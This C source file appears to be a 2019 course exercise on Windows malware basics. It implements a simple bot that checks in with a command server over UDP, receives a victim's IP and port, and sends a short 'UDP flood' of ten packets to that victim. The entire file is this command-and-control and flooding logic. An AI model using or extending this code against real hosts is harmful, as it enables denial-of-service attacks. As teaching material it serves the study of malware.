/*

수업 : 윈도우즈보안과악성코드기초 (02)
날짜 : 2019년 4월 16일
이름 : 이혜원

*/

#define _WINSOCK_DEPRECATED_NO_WARNINGS				//inet_addr()의 문제 해결
#define DESTINATION "255.255.255.0"					//상대 주소, 정보보호를 위해 디폴트로 정했지만 실제 사용시 상대 ip 대입
#define PORT 10004
#define PACKET_SIZE 64

#include <stdio.h>									//printf를 사용하기 위한 헤더파일
#include <WinSock2.h>								//소켓을 사용하기 위한 헤더파일
#include <conio.h>									//실행 후 자동 닫기 방지

#pragma comment(lib, "ws2_32")						//위에서 선언한 헤더파일들을 가져다 쓰기 위한 링크

int main() {

	//원속 초기화
	WSADATA wsaData;								//Windows의 소켓 초기화 정보를 저장하기위한 구조체
	WSAStartup(MAKEWORD(2, 2), &wsaData);			//소켓 버전은 2.2 

	int ssocket;
	int clen;
	struct sockaddr_in client_addr, server_addr, victim_addr;
	char buf[PACKET_SIZE];

	strcpy_s(buf, "IMHACKER_2017111299");

	//소켓 생성
	printf("\n 1. 소켓 생성\n");
	if ((ssocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0) {
		printf(" sendto error : %d\n\n", WSAGetLastError());
		exit(1);
	}

	//소켓 설정
	printf("\n 2. 소켓 설정\n server IP :	%s\n server PORT :	%d\n", DESTINATION, PORT);
	memset(&server_addr, 0, sizeof(server_addr));
	server_addr.sin_family = AF_INET;
	server_addr.sin_addr.s_addr = inet_addr(DESTINATION);
	server_addr.sin_port = htons(PORT);

	//UDP로 데이터 전송
	printf("\n 3. 데이터 전송\n");
	if (sendto(ssocket, (const char*)buf, PACKET_SIZE, 0, (struct sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
		printf(" sendto error : %d\n\n", WSAGetLastError());
		exit(1);
	}
	printf(" send message : %s\n", buf);	//출력

	//UDP로 데이터 수신
	printf("\n 4. 데이터 수신\n");
	clen = sizeof(client_addr);
	int recv = recvfrom(ssocket, (char*)buf, PACKET_SIZE, 0, (struct sockaddr*)&client_addr, &clen);
	if ( recv< 0) {
		printf(" recvfrom error : %d\n\n", WSAGetLastError());
		exit(1);
	}
	buf[recv] = '\0';							//데이터의 문자열 맨 끝에는 널값추가
	printf("%d",recv);
	printf(" receive message : %s\n", buf);		//출력


	////데이터 처리
	printf("\n 5. 데이터 처리\n");
	char victimIP[19];							//victim의 ip를 담을 문자열
	char victimPORT[6];							//victim의 를 담을 문자열

	strcpy_s(buf, strchr(buf,'_')+1);			//"OKEY_" 삭제
	strcpy_s(victimIP, strtok(buf, ":"));
	strcpy_s(victimPORT, strtok(NULL, "\n"));

	printf(" victim IP :	%s\n victim PORT :	%s\n", victimIP, victimPORT);//출력


	//UDP Flooding
	//소켓 주소 재설정
	printf("\n 6. 소켓 주소 재설정\n");
	printf(" server IP :	%s >> %s\n", DESTINATION, victimIP);
	printf(" server PORT :	%d >> %s\n", PORT, victimPORT);
	memset(&victim_addr, 0, sizeof(victim_addr));
	victim_addr.sin_family = AF_INET;
	victim_addr.sin_addr.s_addr = inet_addr(victimIP);
	victim_addr.sin_port = htons(atoi(victimPORT));

	//메세지 설정
	buf[0] = '\0';
	strcat_s(buf, "20171111299");

	//UDP로 데이터 전송
	printf("\n 7. victim에 데이터 전송\n");
	for (int i = 0; i < 10; i++){
		if (sendto(ssocket, (const char*)buf, PACKET_SIZE, 0, (struct sockaddr*)&victim_addr, sizeof(victim_addr)) == SOCKET_ERROR) {
			printf(" sendto error : %d\n\n", WSAGetLastError());
			exit(1);
		}
		printf(" send message : %s .....%2d\n", buf, i+1);	//출력
	}



	//소켓 종료
	closesocket(ssocket);

	WSACleanup();

	getch();
	return 0;
}

